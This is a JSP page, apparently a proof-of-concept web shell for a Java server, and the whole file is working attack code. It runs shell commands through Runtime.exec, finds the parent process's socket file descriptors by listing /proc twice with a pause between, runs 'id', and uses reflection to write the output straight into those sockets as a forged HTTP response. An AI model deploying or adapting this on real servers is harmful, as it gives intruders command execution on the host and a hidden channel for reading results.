<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    Runtime rt = Runtime.getRuntime();
    String[] cmd = {
        "/bin/sh", "-c", "ls -l /proc/$PPID/fd | grep socket | awk '{print $9}'"
    };
    Process process = rt.exec(cmd);
    java.io.InputStream in = process.getInputStream();
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    java.util.HashSet set = new java.util.HashSet();
    while ((s = stdInput.readLine()) != null) {
        set.add(s);
    }

    try {
        Thread.sleep((long)3000);//sleep 3 seconds
    } catch (InterruptedException e) {
        //pass
    }

    process = rt.exec(cmd);
    in = process.getInputStream();
    resultReader = new java.io.InputStreamReader(in);
    stdInput = new java.io.BufferedReader(resultReader);

    while ((s = stdInput.readLine()) != null) {
        if(!set.contains(s)){
            continue;
        }
        try {
            int num = Integer.valueOf(s.toString()).intValue();
            cmd = new String[]{"/bin/sh", "-c", "id"};
            String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
//            String body = "bitch";
            String body = res;
            String resp = "HTTP/1.1 200 OK\r\n"
                + "Content-Type: text/html\r\n"
                + "Content-Length: " + body.length()
                + "\r\n\r\n"
                + body
                + "\r\n\r\n";
            java.lang.reflect.Constructor c=java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
            c.setAccessible(true);
            java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(new Object[]{new Integer(num)}));
            os.write(resp.getBytes());
            os.close();
        }catch (Exception e){}
    }
%>
